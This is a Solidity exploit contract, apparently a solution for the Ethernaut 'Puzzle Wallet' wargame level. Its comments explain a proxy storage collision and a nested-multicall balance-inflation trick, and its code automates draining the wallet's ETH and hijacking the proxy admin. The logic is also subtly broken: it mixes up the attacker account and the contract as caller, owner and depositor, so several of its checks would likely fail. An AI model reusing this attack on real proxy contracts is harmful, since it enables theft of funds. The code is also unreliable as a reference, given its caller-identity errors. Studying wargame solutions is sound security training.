// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
}

interface IPuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address addr) external view returns (bool);
    function balances(address addr) external view returns (uint256);
    function init(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

/**
 * @title PuzzleWalletExploit
 * @dev Solution contract for Ethernaut Level 24 - Puzzle Wallet
 * 
 * This contract exploits storage collision in a proxy pattern to hijack admin privileges.
 * 
 * The vulnerability:
 * PuzzleProxy and PuzzleWallet have different storage layouts that COLLIDE when used together!
 * 
 * PuzzleProxy storage:
 * - Slot 0: pendingAdmin
 * - Slot 1: admin
 * 
 * PuzzleWallet storage:
 * - Slot 0: owner
 * - Slot 1: maxBalance
 * 
 * Storage Collision:
 * - proxy.pendingAdmin == implementation.owner (both at slot 0)
 * - proxy.admin == implementation.maxBalance (both at slot 1)
 * 
 * Attack Strategy:
 * 
 * Step 1: Become the owner
 * - Call proxy.proposeNewAdmin(ourAddress)
 * - This writes to slot 0 (pendingAdmin in proxy)
 * - But slot 0 is also owner in implementation!
 * - Now we're the owner of PuzzleWallet! ✓
 * 
 * Step 2: Whitelist ourselves
 * - Call wallet.addToWhitelist(ourAddress)
 * - Only owner can do this, and we're now the owner!
 * 
 * Step 3: Drain the contract balance
 * - wallet.setMaxBalance requires contract balance == 0
 * - We need to exploit multicall to inflate our balance
 * - Then drain all funds
 * 
 * Step 4: Exploit multicall vulnerability
 * - multicall checks if deposit is called at top level
 * - But we can nest multicall inside multicall!
 * - Call: multicall([deposit, multicall([deposit])])
 * - First deposit: credits msg.value (e.g., 0.001 ETH)
 * - Nested multicall: same msg.value is reused! (delegatecall preserves msg.value)
 * - Second deposit: credits msg.value again (0.001 ETH)
 * - Result: balance = 0.002 ETH but only sent 0.001 ETH!
 * 
 * Step 5: Drain contract
 * - Use execute to withdraw all real balance
 * - Our internal balance > contract balance
 * - Contract balance becomes 0
 * 
 * Step 6: Become admin
 * - Call wallet.setMaxBalance(ourAddress)
 * - This writes to slot 1 (maxBalance in implementation)
 * - But slot 1 is also admin in proxy!
 * - Now we're the admin! ✓
 * 
 * Why multicall nesting works:
 * - delegatecall preserves msg.value across calls
 * - The check only prevents deposit at the top level of each multicall
 * - Nested multicall is a NEW delegatecall context
 * - So we can call deposit again in the nested context!
 */
contract PuzzleWalletExploit {
    address public proxy;
    address public attacker;
    
    event StepCompleted(string step, string details);
    
    constructor(address _proxy) {
        proxy = _proxy;
        attacker = msg.sender;
    }
    
    /**
     * @dev Execute the complete exploit to become admin
     */
    function exploit() external payable {
        require(msg.sender == attacker, "Not the attacker");
        require(msg.value > 0, "Need some ETH for the exploit");
        
        IPuzzleProxy proxyContract = IPuzzleProxy(proxy);
        IPuzzleWallet wallet = IPuzzleWallet(proxy);
        
        // Step 1: Become owner by exploiting storage collision
        emit StepCompleted("Step 1", "Calling proposeNewAdmin to become owner");
        proxyContract.proposeNewAdmin(attacker);
        
        // Verify we're now the owner
        require(wallet.owner() == attacker, "Failed to become owner");
        emit StepCompleted("Step 1 Complete", "We are now the owner!");
        
        // Step 2: Whitelist ourselves
        emit StepCompleted("Step 2", "Whitelisting ourselves");
        wallet.addToWhitelist(attacker);
        require(wallet.whitelisted(attacker), "Failed to whitelist");
        emit StepCompleted("Step 2 Complete", "We are now whitelisted!");
        
        // Step 3: Exploit multicall to inflate balance
        emit StepCompleted("Step 3", "Inflating balance using multicall vulnerability");
        
        // Prepare the nested multicall
        // Inner multicall: just deposit
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        // Outer multicall: deposit + nested multicall with deposit
        bytes[] memory outerData = new bytes[](2);
        outerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        outerData[1] = abi.encodeWithSelector(wallet.multicall.selector, innerData);
        
        // Execute the exploit: send X ETH but get credited 2X
        wallet.multicall{value: msg.value}(outerData);
        
        uint256 ourBalance = wallet.balances(attacker);
        emit StepCompleted("Step 3 Complete", string(abi.encodePacked("Balance inflated! Internal: ", uint2str(ourBalance), " wei")));
        
        // Step 4: Drain the contract
        emit StepCompleted("Step 4", "Draining contract balance");
        uint256 contractBalance = address(proxy).balance;
        wallet.execute(attacker, contractBalance, "");
        
        require(address(proxy).balance == 0, "Failed to drain contract");
        emit StepCompleted("Step 4 Complete", "Contract drained! Balance is now 0");
        
        // Step 5: Become admin by setting maxBalance to our address
        emit StepCompleted("Step 5", "Setting maxBalance to become admin");
        wallet.setMaxBalance(uint256(uint160(attacker)));
        
        // Verify we're now the admin
        require(proxyContract.admin() == attacker, "Failed to become admin");
        emit StepCompleted("Step 5 Complete", "We are now the admin!");
        
        emit StepCompleted("EXPLOIT COMPLETE", "Successfully hijacked the proxy admin!");
    }
    
    /**
     * @dev Helper function to convert uint to string
     */
    function uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
    
    /**
     * @dev Check current state
     */
    function checkState() external view returns (
        address currentOwner,
        address currentAdmin,
        uint256 currentMaxBalance,
        bool isWhitelisted,
        uint256 ourBalance,
        uint256 contractBalance
    ) {
        IPuzzleProxy proxyContract = IPuzzleProxy(proxy);
        IPuzzleWallet wallet = IPuzzleWallet(proxy);
        
        currentOwner = wallet.owner();
        currentAdmin = proxyContract.admin();
        currentMaxBalance = wallet.maxBalance();
        isWhitelisted = wallet.whitelisted(attacker);
        ourBalance = wallet.balances(attacker);
        contractBalance = address(proxy).balance;
    }
    
    /**
     * @dev Receive ETH from execute
     */
    receive() external payable {}
}
